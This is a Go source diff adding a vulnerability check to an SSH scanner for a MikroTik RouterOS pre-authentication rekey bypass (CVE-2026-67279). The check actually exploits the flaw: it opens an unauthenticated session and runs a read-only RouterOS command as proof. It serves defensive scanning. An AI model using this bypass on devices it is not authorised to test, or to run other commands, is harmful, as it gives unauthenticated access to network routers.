@@ -1,0 +1,138 @@
+package cmd
+
+import (
+	"fmt"
+	"net"
+	"regexp"
+	"strings"
+	"time"
+
+	"github.com/runZeroInc/excrypto/x/crypto/ssh"
+	"github.com/runZeroInc/sshamble/auth"
+)
+
+const checkVulnMikrotikPreauthRekey = "vuln-mikrotik-preauth-rekey"
+
+// CVE-2026-67279 (MikroTrick): RouterOS SSH loses track of the incomplete
+// userauth state when the client requests a key re-exchange before
+// authenticating, and then accepts connection-protocol messages anyway. An
+// unauthenticated client can open a session channel (and dispatch exec
+// requests) without any credentials. Fixed in 7.24.2 / 7.23.4 / 6.49.21.
+//
+// This check needs no credentials and no victim key material: it requests a
+// rekey immediately after the initial key exchange, skips the userauth
+// service entirely, and tries to open a session channel. A patched server
+// (and any sane sshd) refuses the channel; a vulnerable RouterOS accepts it.
+//
+// https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/
+
+func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
+	tname := checkVulnMikrotikPreauthRekey
+	if !conf.IsCheckEnabled(tname) {
+		return nil
+	}
+
+	conf.Logger.Debugf("%s %s is running", addr, tname)
+
+	run := func(rekey bool) *auth.AuthResult {
+		o := options.
+			WithSkipStages("ssh-userauth", "auth").
+			WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
+				_ = c.SetDeadline(time.Now().Add(time.Second * 15))
+				out, err := ses.CombinedOutput("/system resource print")
+				r.SessionOutput = auth.CleanSessionOutput([]byte(out))
+				r.ExitStatus = ""
+				if err != nil {
+					if ee, ok := err.(*ssh.ExitError); ok {
+						r.ExitStatus = fmt.Sprintf("%d", ee.ExitStatus())
+						return nil
+					}
+					return err
+				}
+				return nil
+			})
+		if rekey {
+			// Trigger a client-requested rekey while still unauthenticated.
+			// Packets written afterwards (the channel open) are queued by the
+			// transport and flushed once the rekey completes.
+			o = o.WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
+				if err := uac.RequestKeyExchange(); err != nil {
+					conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
+					return err
+				}
+				conf.Logger.Tracef("%s %s pre-auth rekey requested", addr, tname)
+				return nil
+			})
+		}
+		// ssh.None() is never reached (the auth stage is skipped); it only
+		// satisfies the SSHAuth signature.
+		return auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
+	}
+
+	res := run(true)
+	if res.Stage != "session" {
+		conf.Logger.Debugf("%s %s did not open a pre-auth session after rekey (stage %s): %v", addr, tname, res.Stage, res.Error)
+		return nil
+	}
+
+	// Negative control: without the rekey, the same pre-auth channel open must
+	// be refused. If it also succeeds, the server accepts pre-auth sessions
+	// generally (a different defect, e.g. vuln-exec-skip-userauth), and we
+	// must not attribute it to CVE-2026-67279.
+	if ctrl := run(false); ctrl.Stage == "session" {
+		conf.Logger.Warnf("%s %s control (no rekey) also opened a pre-auth session; not reporting CVE-2026-67279", addr, tname)
+		return nil
+	}
+
+	// Attribute to RouterOS before naming the CVE: either the server banner
+	// (SSH-2.0-ROSSSH) or the proof command output must look like RouterOS.
+	if !mikrotikPreauthRekeyIsRouterOS(res.Version, res.SessionOutput) {
+		conf.Logger.Warnf("%s %s opened a session WITHOUT authentication after a pre-auth rekey, but the service (%q) does not look like RouterOS; not reporting CVE-2026-67279", addr, tname, res.Version)
+		return nil
+	}
+
+	version := mikrotikParseRouterOSVersion(res.SessionOutput)
+	conf.Logger.Warnf("%s %s opened a session WITHOUT authentication via pre-auth rekey", addr, tname)
+	if version != "" {
+		conf.Logger.Infof("%s %s RouterOS version: %s", addr, tname, version)
+	}
+
+	proof := fmt.Sprintf("CVE-2026-67279: session channel opened without authentication after a client-requested pre-auth rekey (server: %s; control without rekey was refused)", res.Version)
+	if version != "" {
+		proof += fmt.Sprintf(". RouterOS version: %s", version)
+	}
+	if res.SessionOutput != "" {
+		proof += fmt.Sprintf(". /system resource print: %s", res.SessionOutput)
+	}
+
+	root.AddVuln(auth.VulnResult{
+		ID:    tname,
+		Ref:   "https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/",
+		Proof: proof,
+	})
+
+	res.SessionMethod = tname
+	root.SessionMethod = tname
+	root.SessionOutput = res.SessionOutput
+	root.ExitStatus = res.ExitStatus
+
+	return res
+}
+
+// mikrotikPreauthRekeyIsRouterOS reports whether the server banner or the
+// proof command output identifies the target as MikroTik RouterOS.
+func mikrotikPreauthRekeyIsRouterOS(serverVersion string, output string) bool {
+	return strings.Contains(serverVersion, "ROSSSH") || strings.Contains(output, "MikroTik")
+}
+
+var mikrotikVersionPattern = regexp.MustCompile(`version:\s*(\S+)`)
+
+// mikrotikParseRouterOSVersion extracts the version string from the output of
+// "/system resource print" ("version: 7.24.1 (stable)"), or "" if absent.
+func mikrotikParseRouterOSVersion(output string) string {
+	m := mikrotikVersionPattern.FindStringSubmatch(output)
+	if m == nil {
+		return ""
+	}
+	return m[1]
+}
